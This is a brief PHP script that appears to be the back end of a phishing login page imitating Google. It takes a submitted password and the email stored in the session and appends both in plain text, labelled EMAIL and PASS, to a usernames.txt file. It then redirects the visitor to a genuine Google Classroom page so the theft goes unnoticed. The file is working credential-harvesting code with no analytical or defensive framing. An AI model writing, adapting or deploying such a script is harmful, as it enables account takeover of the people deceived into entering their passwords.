<?php
session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
  			
 file_put_contents("usernames.txt", "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass . "\n", FILE_APPEND);
 header('Location: https://classroom.google.com/c/MTg4NzQ2Mjk1NDMz/p/MjE4MjAwMjE2MjE5');
exit();
	
			
session_destroy();
			
?>
